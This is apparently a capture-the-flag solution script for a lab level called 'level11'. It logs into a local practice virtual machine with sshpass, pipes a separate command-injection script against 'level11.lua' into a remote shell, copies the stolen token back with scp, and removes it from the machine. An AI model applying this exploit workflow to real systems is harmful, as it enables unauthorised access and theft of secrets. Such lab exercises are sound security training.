#!/bin/sh -eu

PREVIOUS_FLAG=../../level10/flag
ADDRESS=192.168.122.214
PORT=4242
TOKEN=/tmp/token
FLAG=../flag2

# Run the script to hack the `level11.lua` file and get the token on the virtual machine
sshpass -f ${PREVIOUS_FLAG} <inject_shell_command.sh >${FLAG} 2>/dev/null \
	ssh -p ${PORT} level11@${ADDRESS} sh -s

# Copy the token from the virtual machine
sshpass -f ${PREVIOUS_FLAG} 2>/dev/null \
	scp -P ${PORT} level11@${ADDRESS}:${TOKEN} ${FLAG}

# Clean the virtual machine
sshpass -f ${PREVIOUS_FLAG} 2>/dev/null \
	ssh -p ${PORT} level11@${ADDRESS} \
		rm -f ${TOKEN}

exit 0
